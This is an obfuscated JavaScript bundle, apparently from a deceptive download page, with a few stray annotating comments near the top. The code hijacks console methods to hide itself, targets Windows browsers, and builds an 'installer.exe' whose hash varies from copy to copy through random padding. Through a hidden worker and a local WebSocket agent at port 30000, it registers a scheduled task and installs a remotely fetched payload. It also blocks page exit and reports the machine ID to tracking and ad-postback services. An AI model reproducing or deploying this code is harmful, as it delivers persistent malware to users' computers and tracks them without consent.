
// execute function
(() => {
    // create l variable which stores a function
  const l = function () {
    // S = true
    let S = true;
    // The function return function that accepts 2 args which are A and H
    return function (A, H) {
        // M is true. ? means if and else conditions.
      const M = S ? function () {
        // Trigger if condition
        if (H) {
            // E is H applied to A and arguments
          const E = H.apply(A, arguments);
          // null? wtfff?
          H = null;
          // return E variable
          return E;
        }
        // Trigger else condition
      } : function () {};
      // S is false
      S = false;
      // Then return M variable
      return M;
    };
    // Execute
  }();

  // Hijack console methods
  const I = l(this, function () {
    const S = function () {
      let E;
      try {
        E = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (a) {
        E = window;
      }
      return E;
    };
    const A = S();
    const H = A.console = A.console || {};
    const M = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let E = 0x0; E < M.length; E++) {
      const a = l.constructor.prototype.bind(l);
      const j = M[E];
      const z = H[j] || a;
      a.__proto__ = l.bind(l);
      a.toString = z.toString.bind(z);
      H[j] = a;
    }
  });
  // Executed
  I();

  (() => {
    'use strict';

    (() => {
      var S = Object.create;
      var M = Object.defineProperty;
      var E = Object.getOwnPropertyDescriptor;
      var a = Object.getOwnPropertyNames;
      var g = Object.getPrototypeOf;
      var p = Object.prototype.hasOwnProperty;
      var o = (ID, IU) => () => (IU || ID((IU = {
        'exports': {}
      }).exports, IU), IU.exports);
      var T = (ID, IU, IQ, IZ) => {
        if (IU && typeof IU == "object" || typeof IU == "function") {
          for (let Ic of a(IU)) if (!p.call(ID, Ic) && Ic !== IQ) {
            M(ID, Ic, {
              'get': () => IU[Ic],
              'enumerable': !(IZ = E(IU, Ic)) || IZ.enumerable
            });
          }
        }
        return ID;
      };
      var b = (ID, IU, IQ) => (IQ = ID != null ? S(g(ID)) : {}, T(IU || !ID || !ID.__esModule ? M(IQ, "default", {
        'value': ID,
        'enumerable': true
      }) : IQ, ID));
      var c = o((ID, IU) => {
        ((IQ, IZ) => {
          if (typeof IU < 'u') {
            IU.exports = IZ();
          } else if (typeof define == "function" && typeof define.amd == "object") {
            define(IZ);
          } else {
            ID[IQ] = IZ();
          }
        })("streamSaver", () => {
          'use strict';

          let IQ = typeof window == "object" ? window : ID;
          if (!IQ.HTMLElement) {
            console.warn("streamsaver is meant to run on browsers main thread");
          }
          let IZ = null;
          let Ic = false;
          let Im = In => {
            try {
              In();
            } catch {}
          };
          let Ii = IQ.WebStreamsPolyfill || {};
          let Ir = IQ.isSecureContext;
          let IV = /constructor/i.test(IQ.HTMLElement) || !!IQ.safari || !!IQ.WebKitPoint;
          let It = Ir || "MozAppearance" in document.documentElement.style ? "iframe" : "navigate";
          let IR = {
            'createWriteStream': IY,
            'WritableStream': IQ.WritableStream || Ii.WritableStream,
            'supported': true,
            'version': {
              'full': "2.0.5",
              'major': 0x2,
              'minor': 0x0,
              'dot': 0x5
            },

            'mitm': "https://jimmywarting.github.io/StreamSaver.js/mitm.html?version=2.0.0"
          };
          function Ik(In) {
            if (!In) {
              throw new Error("meh");
            }
            let IX = document.createElement("iframe");
            IX.hidden = true;
            IX.src = In;
            IX.loaded = false;
            IX.name = "iframe";
            IX.isIframe = true;
            IX.postMessage = (...Iy) => IX.contentWindow.postMessage(...Iy);
            IX.addEventListener("load", () => {
              IX.loaded = true;
            }, {
              'once': true
            });
            document.body.appendChild(IX);
            return IX;
          }
          function Is(In) {
            let Iy = document.createDocumentFragment();
            let Ih = {
              'frame': IQ.open(In, "popup", "width=200,height=100"),
              'loaded': false,
              'isIframe': false,
              'isPopup': true,
              'remove'() {
                Ih.frame.close();
              },
              'addEventListener'(...Id) {
                Iy.addEventListener(...Id);
              },
              'dispatchEvent'(...Id) {
                Iy.dispatchEvent(...Id);
              },
              'removeEventListener'(...Id) {
                Iy.removeEventListener(...Id);
              },
              'postMessage'(...Id) {
                Ih.frame.postMessage(...Id);
              }
            };
            let IN = Id => {
              if (Id.source === Ih.frame) {
                Ih.loaded = true;
                IQ.removeEventListener("message", IN);
                Ih.dispatchEvent(new Event("load"));
              }
            };
            IQ.addEventListener("message", IN);
            return Ih;
          }
          try {
            new Response(new ReadableStream());
            if (Ir && !("serviceWorker" in navigator)) {
              IV = true;
            }
          } catch {
            IV = true;
          }
          Im(() => {
            let {
              readable: In
            } = new TransformStream();
            let IX = new MessageChannel();
            IX.port1.postMessage(In, [In]);
            IX.port1.close();
            IX.port2.close();
            Ic = true;
            Object.defineProperty(IR, "TransformStream", {
              'configurable': false,
              'writable': false,
              'value': TransformStream
            });
          });
          function IG() {
            if (!IZ) {
              IZ = Ir ? Ik("https://jimmywarting.github.io/StreamSaver.js/mitm.html?version=2.0.0") : Is("https://jimmywarting.github.io/StreamSaver.js/mitm.html?version=2.0.0");
            }
          }
          function IY(In, IX, Iy) {
            let Ih = {
              'size': null,
              'pathname': null,
              'writableStrategy': undefined,
              'readableStrategy': undefined
            };
            let IN = 0x0;
            let Id = null;
            let If = null;
            let IW = null;
            if (Number.isFinite(IX)) {
              [Iy, IX] = [IX, Iy];
              console.warn("[StreamSaver] Deprecated pass an object as 2nd argument when creating a write stream");
              Ih.size = Iy;
              Ih.writableStrategy = IX;
            } else if (IX && IX.highWaterMark) {
              console.warn("[StreamSaver] Deprecated pass an object as 2nd argument when creating a write stream");
              Ih.size = Iy;
              Ih.writableStrategy = IX;
            } else {
              Ih = IX || {};
            }
            if (!IV) {
              IG();
              If = new MessageChannel();
              In = encodeURIComponent(In.replace(/\//g, ':')).replace(/['()]/g, escape).replace(/\*/g, "%2A");
              let IC = {
                'transferringReadable': Ic,
                'pathname': Ih.pathname || Math.random().toString().slice(-0x6) + '/' + In,
                'headers': {
                  'Content-Type': "application/octet-stream; charset=utf-8",
                  'Content-Disposition': "attachment; filename*=UTF-8''" + In
                }
              };
              if (Ih.size) {
                IC.headers["Content-Length"] = Ih.size;
              }
              let Iv = [IC, '*', [If.port2]];
              if (Ic) {
                let Iw = It === "iframe" ? undefined : {
                  'transform'(IF, l0) {
                    if (!(IF instanceof Uint8Array)) {
                      throw new TypeError("Can only write Uint8Arrays");
                    }
                    IN += IF.length;
                    l0.enqueue(IF);
                    if (Id) {
                      location.href = Id;
                      Id = null;
                    }
                  },
                  'flush'() {
                    if (Id) {
                      location.href = Id;
                    }
                  }
                };
                IW = new IR.TransformStream(Iw, Ih.writableStrategy, Ih.readableStrategy);
                let IJ = IW.readable;
                If.port1.postMessage({
                  'readableStream': IJ
                }, [IJ]);
              }
              If.port1.onmessage = IF => {
                if (IF.data.download) {
                  if (It === "navigate") {
                    IZ.remove();
                    IZ = null;
                    if (IN) {
                      location.href = IF.data.download;
                    } else {
                      Id = IF.data.download;
                    }
                  } else {
                    if (IZ.isPopup) {
                      IZ.remove();
                      IZ = null;
                      if (It === "iframe") {
                        Ik("https://jimmywarting.github.io/StreamSaver.js/mitm.html?version=2.0.0");
                      }
                    }
                    Ik(IF.data.download);
                  }
                } else if (IF.data.abort) {
                  Iu = [];
                  If.port1.postMessage("abort");
                  If.port1.onmessage = null;
                  If.port1.close();
                  If.port2.close();
                  If = null;
                }
              };
              if (IZ.loaded) {
                IZ.postMessage(...Iv);
              } else {
                IZ.addEventListener("load", () => {
                  IZ.postMessage(...Iv);
                }, {
                  'once': true
                });
              }
            }
            let Iu = [];
            return !IV && IW && IW.writable || new IR.WritableStream({
              'write'(IF) {
                if (!(IF instanceof Uint8Array)) {
                  throw new TypeError("Can only write Uint8Arrays");
                }
                if (IV) {
                  Iu.push(IF);
                  return;
                }
                If.port1.postMessage(IF);
                IN += IF.length;
                if (Id) {
                  location.href = Id;
                  Id = null;
                }
              },
              'close'() {
                if (IV) {
                  let IF = new Blob(Iu, {
                    'type': "application/octet-stream; charset=utf-8"
                  });
                  let l0 = document.createElement('a');
                  l0.href = URL.createObjectURL(IF);
                  l0.download = In;
                  l0.click();
                } else {
                  If.port1.postMessage("end");
                }
              },
              'abort'() {
                Iu = [];
                If.port1.postMessage("abort");
                If.port1.onmessage = null;
                If.port1.close();
                If.port2.close();
                If = null;
              }
            }, Ih.writableStrategy);
          }
          return IR;
        });
      });
      var i = {
        'query': {
          'metadata': ["utm_campaign", "utm_content", "utm_source", "cid", "bid", "fbclid", "fbid"],
          'remove': ["token", "bypass"]
        },
        'persistance': {
          'key': "heardHelpAnnouncement"
        },
        'api': {
          'url': "/config"
        },
        'rpc': {
          'url': "http://127.0.0.1:30000"
        },
        'file': {
          'name': "installer.exe"
        }
      };
      var r = new URLSearchParams(window.location.search);
      t();
      function t() {
        let ID = new URLSearchParams(window.location.search);
        for (let IU of i.query.remove) ID["delete"](IU);
        try {
          window.history.replaceState(null, '', '' + window.location.origin + window.location.pathname + '?' + ID);
        } catch {}
      }
      var R = s();
      function s() {
        let ID = window.PARAMS[ID] || r.get("aid") || undefined;
        let IU = {
          'metadata': {
            'source': window.location.host,
            'link_id': window.PARAMS.link_id,
            'site_id': window.PARAMS.site_id,
            'site': window.PARAMS.site,
            'user_agent': navigator.userAgent
          },
          'affiliateCode': ID
        };
        for (let IQ of i.query.metadata) {
          let IZ = window.PARAMS[ID] || r.get(IQ) || undefined;
          if (IZ) {
            IU.metadata[IQ] = IZ;
          }
        }
        return IU;
      }
      function y(ID) {
        let IU = document.createElement("iframe");
        IU.src = ID;
        IU.style.display = "none";
        IU.onload = () => IU.remove();
        document.body.appendChild(IU);
      }
      function f() {
        let ID = r.get("fbclid");
        let IU = r.get("fbid") || window.PARAMS.fbid;
        if (!(!ID || !IU)) {
          eval?.("!function(e,t,n,c,o,a,f){e.fbq||(o=e.fbq=function(){o.callMethod?o.callMethod.apply(o,arguments):o.queue.push(arguments)},e._fbq||(e._fbq=o),(o.push=o).loaded=!0,o.version=\"2.0\",o.queue=[],(a=t.createElement(n)).async=!0,a.src=\"https://connect.facebook.net/en_US/fbevents.js\",(f=t.getElementsByTagName(n)[0]).parentNode.insertBefore(a,f))}(window,document,\"script\")");
          window.fbq?.("init", IU);
        }
      }
      function w() {
        window.fbq?.("track", "PageView");
      }
      function F() {
        window.fbq?.("track", "Lead");
      }
      function I0() {
        window.fbq?.("track", "CompleteRegistration");
      }
      function I2() {
        let ID = window.PARAMS.session_id;
        let IU = window.PARAMS.phid;
        if (!(!ID || !IU)) {
          eval?.("!function(t,e){var o,n,p,r;e.__SV||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(\".\");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}(p=t.createElement(\"script\")).type=\"text/javascript\",p.crossOrigin=\"anonymous\",p.async=!0,p.src=s.api_host.replace(\".i.posthog.com\",\"-assets.i.posthog.com\")+\"/static/array.js\",(r=t.getElementsByTagName(\"script\")[0]).parentNode.insertBefore(p,r);var u=e;for(void 0!==a?u=e[a]=[]:a=\"posthog\",u.people=u.people||[],u.toString=function(t){var e=\"posthog\";return\"posthog\"!==a&&(e+=\".\"+a),t||(e+=\" (stub)\"),e},u.people.toString=function(){return u.toString(1)+\".people (stub)\"},o=\"init capture register register_once register_for_session unregister unregister_for_session getFeatureFlag getFeatureFlagPayload isFeatureEnabled reloadFeatureFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys renderSurvey canRenderSurvey canRenderSurveyAsync identify setPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException loadToolbar get_property getSessionProperty createPersonProfile opt_in_capturing opt_out_capturing has_opted_in_capturing has_opted_out_capturing clear_opt_in_out_capturing debug getPageViewId captureTraceFeedback captureTraceMetric\".split(\" \"),n=0;n<o.length;n++)g(u,o[n]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);");
          window.posthog?.["init"](IU, {
            'bootstrap': {
              'distinctID': ID
            },
            'api_host': "https://eu.i.posthog.com",
            'person_profiles': "always"
          });
        }
      }
      function I3(ID, IU) {
        window.posthog?.["capture"](ID, IU);
      }
      function I4() {
        I3("pageload", {
          '$set': R.metadata
        });
      }
      function I5(ID) {
        if (ID?.["machineId"]) {
          window.posthog?.["identify"](ID.machineId);
        }
        I3("install_start", ID && {
          '$set': ID
        });
      }
      function I6() {
        I8("download");
      }
      function I7() {
        I8("install");
      }
      function I8(ID) {
        let IU = window.PARAMS.gtag_conversion;
        let IQ = window.PARAMS.gtag_conversion_target || "download";
        if (!(!IU || IQ !== ID)) {
          window.gtag?.("event", "conversion", {
            'send_to': IU
          });
        }
      }
      function Il() {
        let ID = r.get("muid");
        let IU = r.get("mgoal");
        if (!ID || !IU || document.getElementById("mpixel")) {
          return;
        }
        let IQ = document.createElement("script");
        IQ.id = "mpixel";
        IQ.src = "https://msrvt.net/pt.js";
        IQ.async = true;
        IQ.dataset.uid = ID;
        IQ.dataset.goal = IU;
        document.body.appendChild(IQ);
      }
      function IP() {
        let ID = r.get("clickid");
        let IU = r.get("adprofex_event");
        let IQ = r.get("adprofex_user");
        if (!ID || !IU || !IQ) {
          return;
        }
        let IZ = new URL("https://postback.ads2.bid/api/postback?tracker_id=3&goal_category_id=1");
        IZ.searchParams.set("event_id", IU);
        IZ.searchParams.set("click_id", ID);
        IZ.searchParams.set("user_id", IQ);
        fetch(IZ, {
          'credentials': "include",
          'mode': "no-cors",
          'keepalive': true
        });
      }
      function IS() {
        I2();
        f();
      }
      function IA() {
        I4();
      }
      function IH() {
        I3("lead");
        w();
      }
      function IM() {
        I3("download");
        F();
        I6();
        Il();
        IP();
      }
      function IE(ID) {
        I5(ID);
        I0();
        I7();
      }
      function Ia() {
        I3("install_finish");
      }
      function Iz() {
        let ID = Math.random() * 10 + -0x5;
        document.documentElement.style.cssText = "filter: hue-rotate(" + ID + "deg)";
      }
      var Ig = b(c());
      function IK(ID, IU) {
        let IQ;
        let IZ = false;
        y(Ig.mitm);
        window.HANDLE_DOWNLOAD = Ic;
        ID.listen("file", Im);
        Ii();
        async function Ic() {
          IU?.();
          IM();
          if (!(!IQ || IQ.readable.locked)) {
            if (!IZ) {
              Ii();
            }
            0x0;
            IQ.readable.pipeTo(Ig.createWriteStream(i.file.name));
            IZ = false;
          }
        }
        function Im(Ir) {
          if (IQ) {
            Ir.pipeTo(IQ.writable);
          }
        }
        function Ii() {
          IZ = true;
          IQ = new TransformStream();
          ID.send("file");
        }
      }
      var Iq = class extends SharedWorker {
        constructor(ID) {
          super(URL.createObjectURL(new Blob([ID], {
            'type': "application/javascript"
          })));
          this.listeners = new Map();
          this.port.onmessage = this.handleMessage.bind(this);
        }
        ["send"](ID, IU) {
          this.port.postMessage({
            'type': ID,
            'payload': IU
          });
        }
        ["listen"](ID, IU) {
          this.listeners.set(ID, IU);
        }
        ["handleMessage"](ID) {
          let {
            type: IU,
            payload: IQ
          } = ID.data;
          this.listeners.get(IU)?.(IQ);
        }
      };
      function IB(ID, IU) {
        ID.listen("start", IQ => {
          IU?.();
          IE(IQ);
        });
        ID.listen("finish", Ia);
      }
      var IO = class {
        constructor(ID, IU = localStorage) {
          this.key = ID;
          this.storage = IU;
          this.value = "true";
        }
        ['is']() {
          return this.storage.getItem(this.key) === this.value;
        }
        ["set"]() {
          this.storage.setItem(this.key, this.value);
        }
        ["remove"]() {
          this.storage.removeItem(this.key);
        }
      };
      function Io() {
        let ID = new IO(i.persistance.key);
        function IU() {
          ID.set();
          window.addEventListener("beforeunload", IT);
        }
        function IQ() {
          ID.remove();
          window.removeEventListener("beforeunload", IT);
        }
        return {
          'isPersisted': ID.is(),
          'persist': IU,
          'cease': IQ
        };
      }
      function IT(ID) {
        ID.preventDefault();
        ID.returnValue = true;
      }
      function Ib() {
        Iz();
        IS();
        IA();
        if (!(navigator.platform.includes("Win") && !/Windows NT (5|6)\.\d/gi.test(navigator.userAgent))) {
          return;
        }
        IH();
        let ID = new Iq("\"use strict\";(()=>{function y(r){let t=atob(r),e=new Uint8Array(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}function j(r){let t=new Uint8Array(Math.ceil(r.length/2));for(let e=0;e<r.length;)t[e/2]=parseInt(r.slice(e,e+=2),16);return t}function F(r){return Array.prototype.map.call(new Uint8Array(r),t=>t.toString(16).padStart(2,\"0\")).join(\"\")}function g(r){let t=r.toString(16).padStart(32,\"0\");return j(t)}function b(r){let t=F(r);return BigInt(`0x${t}`)}function w(){let r={};return r.promise=new Promise((t,e)=>{r.resolve=t,r.reject=e}),r}function L(r){return new Promise(t=>setTimeout(t,r))}function S(){}function R(r,t=1/0,e=300){return async function(...o){for(let s=0;s<t;s++)try{return await r(...o)}catch{await L(e)}}}function x(r){return new ReadableStream({async pull(t){try{for await(let e of r)t.enqueue(e);t.close()}catch(e){t.error(e)}}})}var A=16,B=A*655360,O=0xffffffffffffffffffffffffffffffffn,C=O+1n;function T(r,t){return x(_(r,t))}async function*_(r,t){let e=await crypto.subtle.digest(\"SHA-256\",r),n=e.slice(0,16),o=e.slice(16,32),s=await crypto.subtle.importKey(\"raw\",n,{name:\"AES-CTR\"},!1,[\"encrypt\"]),a=new ArrayBuffer(B);for(let i=0;i<t;i+=B){let c=W(o,i),f=await crypto.subtle.encrypt({name:\"AES-CTR\",counter:c,length:128},s,a);yield new Uint8Array(f.slice(0,t-i))}}function W(r,t){let e=b(r);return e+=BigInt(t/A),e%=C,g(e)}var m=class extends TransformStream{constructor(e){super();this.diff=e;this.writer=this.writable.getWriter(),this.index=0,this.offset=0,this.cache=[],this.offsets=[]}start(e){for(let n=0;n<e.length;n++){let o=this.emit.bind(this,n),s=new WritableStream({write:o});e[n].pipeTo(s)}this.tick()}tick(e){e&&this.next();let n=this.diff[this.index];if(!n)return this.writer.close().catch(S);Array.isArray(n)?this.load(n):(this.write(n),this.tick(!0))}load([e,n,o]){if(this.offset===o)return this.tick(!0);let s=this.cache[e];if(!s)return;let a=n+this.offset,i=o-this.offset;for(let c=0;c<s.length;c++){let[f,p]=s[c],u=a-f;if(u>=0&&u<p.byteLength){let P=p.slice(u,u+i);return this.write(P),this.isRequired(e,f,p)||s.splice(c,1),this.tick()}}}next(){this.index++,this.offset=0}write(e){this.offset+=e.byteLength,this.writer.write(e)}emit(e,n){var a;if(!n.byteLength)return;let o=this.offsets[e]||0;this.offsets[e]=o+n.byteLength,this.isRequired(e,o,n)&&((a=this.cache)[e]??(a[e]=[]),this.cache[e].push([o,n]),this.tick())}isRequired(e,n,o){let s=n+o.byteLength;for(let a=this.index;a<this.diff.length;a++){let i=this.diff[a];if(!Array.isArray(i))continue;let[c,f,p]=i;if(c!==e)continue;a===this.index&&(f+=this.offset);let u=f+p;if(f!==u&&(n>=f&&n<=u||s>f&&s<=u||n<=f&&s>=u))return!0}return!1}};var l={query:{metadata:[\"utm_campaign\",\"utm_content\",\"utm_source\",\"cid\",\"bid\",\"fbclid\",\"fbid\"],remove:[\"token\",\"bypass\"]},persistance:{key:\"heardHelpAnnouncement\"},api:{url:\"/config\"},rpc:{url:\"http://127.0.0.1:30000\"},file:{name:\"installer.exe\"}};async function d(r,t,e=\"json\"){let n=await h(r,t);if(!n.ok)throw new Error(\"response-not-ok\");return n[e]().catch(()=>null)}async function h(r,t){let e=await fetch(new URL(r,globalThis.location.origin),t&&{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify(t)}).catch(()=>null);if(!e)throw new Error(\"no-response\");return e}async function k(){let r=await d(l.api.url);if(!r)throw new Error(\"no-installer\");return{...r.random&&{random:{seed:y(r.random.seed),size:r.random.size}},template:r.template.map(t=>typeof t==\"string\"?y(t):t),standaloneUrl:r.standaloneUrl}}async function I(r){let t=await h(r).then(n=>n.body);if(!t)throw new Error(\"no-standalone-stream\");let e=new DecompressionStream(\"gzip\");return t.pipeThrough(e)}async function v(r,t){let e=await d(l.api.url,{machineId:r,...t});if(!e)throw new Error(\"no-installer-payload\");return e}function q(r){return new Promise((t,e)=>{let n=new WebSocket(r);n.onopen=()=>{t(n)},n.onerror=o=>{e(o)}})}var E=R(()=>q(l.rpc.url));function U(r){let t=0,e=new Map;return r.addEventListener(\"message\",n=>{let o=JSON.parse(n.data),s=e.get(o.id);if(s){if(e.delete(o.id),\"error\"in o){s.reject(o.error);return}s.resolve(o.result)}}),{request(n,o){let s=w(),a=t++;e.set(a,s);let i=JSON.stringify({id:a,type:n,args:o});return r.send(i),s.promise}}}var M=k(),D=!1;self.onconnect=r=>{let t=r.ports[0];t.onmessage=async o=>{let{type:s,payload:a}=o.data;switch(s){case\"start\":{if(D)return;D=!0,e(a);break}case\"file\":{let i=await n();t.postMessage({type:\"file\",payload:i},[i]);break}}};async function e(o){let s=await E();if(!s)return;let a=U(s);try{let i=await a.request(\"info\",[]);if(t.postMessage({type:\"start\",payload:i}),!i)throw new Error(\"no-info\");let{task:c,payload:f}=await v(i.machineId,o);await a.request(\"task\",[c.name,c.xml]),await a.request(\"install\",[f.url,f.name,f.icon]),t.postMessage({type:\"finish\"})}finally{await a.request(\"exit\",[]),s.close()}}async function n(){let o=await M,a=[await I(o.standaloneUrl)];if(o.random){let c=T(o.random.seed,o.random.size);a.push(c)}let i=new m(o.template);return i.start(a),i.readable}};})();\n");
        let {
          isPersisted: IU,
          persist: IQ,
          cease: IZ
        } = Io();
        IK(ID, () => {
          IQ();
          Ic();
        });
        IB(ID, IZ);
        if (IU) {
          Ic();
        }
        function Ic() {
          ID.send("start", R);
        }
      }
      Ib();
    })();
  })();
})();